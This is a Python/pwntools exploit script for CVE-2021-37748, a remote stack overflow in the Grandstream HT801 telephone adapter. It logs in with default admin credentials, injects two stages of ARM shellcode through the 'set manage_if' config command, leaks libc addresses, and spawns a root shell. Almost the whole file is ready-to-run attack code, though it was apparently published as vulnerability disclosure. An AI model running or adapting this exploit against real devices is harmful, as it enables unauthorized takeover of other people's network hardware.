'''
CVE-2021-37748 Grandstream HT801 ATA remote stack overflow.

Tested on:
1.0.27.2
1.0.25.5

Adam Simuntis <adam.simuntis(at)secforce.com>
Mindaugas Slusnys <mindaugas.slusnys(at)secforce.com>
'''
from pwn import *
from struct import pack,unpack
context.arch='arm'

IP='192.168.1.128'
PASS='admin'

def send_payload(payload):
    p.sendlineafter(b'CONFIG> ',b'set manage_if '+payload)
    p.recv()

s = ssh(host=IP,user='admin',password=PASS,level='error')
p = s.system(None)

# Prep. for Stage2, exiting from CONFIG> will trigger
pivot = asm('sub sp,sp, #964;')

fix_regs = asm("""
sub r4,r10, #2000; 
sub r11, r4, #108; 
sub r7, r4, #112;
""")
load_puts_got = asm("""
mov r6, #0x1; 
mov r6, r6, lsl #8; 
add r6, r6, #0x58; 
mov r6, r6, lsl #8; 
add r6, r6, #0x9c; 
mov r0, r6, ror r8
""")
jmp_puts = asm("""
mov r6, #0xA3; 
mov r6, r6, lsl #8; 
add r6, r6, #0x48; 
mov r1, r8; 
mov pc, r6;
""")

sc = pivot + fix_regs + load_puts_got + jmp_puts
payload = b'A'*134 + sc

# Enter CONFIG>
p.sendlineafter(b'GS> ',b'config')

# Data will be allocated at the static address on the heap for requests larger than 100 bytes. Heap is rwx.
send_payload(payload)

payload = b'B'*52 + p32(0x16098)
log.info("Executing Stage1")
send_payload(payload)

p.sendlineafter(b'CONFIG> ',b'exit')
p.sendlineafter(b'GS> ',b'status')

leak = u32(p.recvuntil(b'CONFIG').split()[8])
log.info("puts      : " + hex(leak))
libc_base = leak - 0x32654 
system = libc_base + 0x5e54c
binsh = libc_base + 0x60eb0

log.info("libc_base : " + hex(libc_base))
log.info("system    : " + hex(system))
log.info("binsh     : " + hex(binsh))

q,w,e,r = unpack('4B',pack('>I',binsh))
load_binsh = asm("""
mov r6, #%d;
mov r6, r6, lsl #8;
add r6, r6, #%d;
mov r6, r6, lsl #8;
add r6, r6, #%d;
mov r6, r6, lsl #8;
add r6, r6, #%d;
mov r0, r6, ror r2;
""" % (q,w,e,r)) 

q,w,e,r = unpack('4B',pack('>I',system))
load_system = asm("""
mov r6, #%d; 
mov r6, r6, lsl #8; 
add r6, r6, #%d; 
mov r6, r6, lsl #8; 
add r6, r6, #%d;  
mov r6, r6, lsl #8; 
add r6, r6, #%d; 
mov pc, r6""" % (q,w,e,r))

stage2 = load_binsh+load_system
# 0x16170 popped into PC @ 0xa578
payload = b'A'*350 + stage2 

# Let's not continue if we encounter bad bytes.
avoid = [b'\x00',b'\x04',b'\t',b'\n',b'\r',b'\x11',b'\x12',b'\x13',b'\x15',b'\x16',b'\x17',b'\x1a',b'\x1c',b'\x7f',b'\xff']
assert not any(c in payload for c in avoid) != 0,"Bad bytes in payload."

log.info("Payload clean")
p.sendlineafter(b'> ',b'set manage_if '+payload)

log.info("Executing Stage2")
# Trigger
p.sendlineafter(b'CONFIG> ',b'exit') 

# Catch garbage
p.recv() 
p.interactive()